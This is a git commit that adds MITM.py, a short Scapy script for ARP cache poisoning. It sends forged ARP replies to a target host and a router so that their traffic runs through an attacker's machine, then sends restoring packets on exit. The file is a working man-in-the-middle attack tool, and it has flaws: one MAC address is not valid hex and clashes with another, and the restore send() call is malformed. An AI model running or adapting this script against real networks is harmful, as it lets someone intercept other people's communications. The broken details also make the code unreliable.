f5374175587bc2db08158efe68e3551019c51ee3
kaxm23 <126640734+kaxm23@users.noreply.github.com>
2023-03-09 09:50:13 +0100

    Create MITM.py
    #first we are building the packet 
    #pdst target ip for example (windows) 
    #psrc source ip of the first interface of ur router   
    #hwdst distanation mac address of target machin
    #hwsrc ur physical mac address for example (kali linux)
    #so i can garantees data that go from windows route to kali 
    #and data came from router to windows also capture by kali
    #those are random mac address just for show how it look like

---
+++ MITM.py
@@ -0,0 +1,21 @@
+from scapy.all import *
+import time
+
+try:
+    while True:
+        #fake arp answer packet for target (windows)
+        arp_reply_target=ARP(op=2,pdst="192.168.1.105",psrc="192.168.1.1",hwdst="18:00:57:e2:57:39",hwsrc="35:7c:ff:f3:38:fe")
+        #fake arp answer  packet for router 
+        arp_reply_target_router=ARP(op=2,pdst="192.168.1.1",psrc="192.168.1.105",hwdst="e8:y8:hh:14:09:4d",hwsrc="35:7c:ff:f3:38:fe")
+        send(arp_reply_target)
+        send(arp_reply_target_router)
+        #print(arp_reply_target.show())
+        time.sleep(2)
+except KeyboardInterrupt as err:
+    #real arp packet for target
+    arp_reply_target_real=ARP(op=2,pdst="192.168.1.105",psrc="192.168.1.1",hwdst="18:00:57:e2:57:39",hwsrc="e8:48:b8:14:09:4d")
+    #real arp packet for router
+    arp_reply_target_router_real=ARP(op=2,pdst="192.168.1.1",psrc="192.168.1.105",hwdst="e8:y8:hh:14:09:4d",hwsrc="18:00:57:e2:57:39")
+    send(arp_reply_target_real,arp_reply_target_router_real)
+    print("")
+    print("Exit")
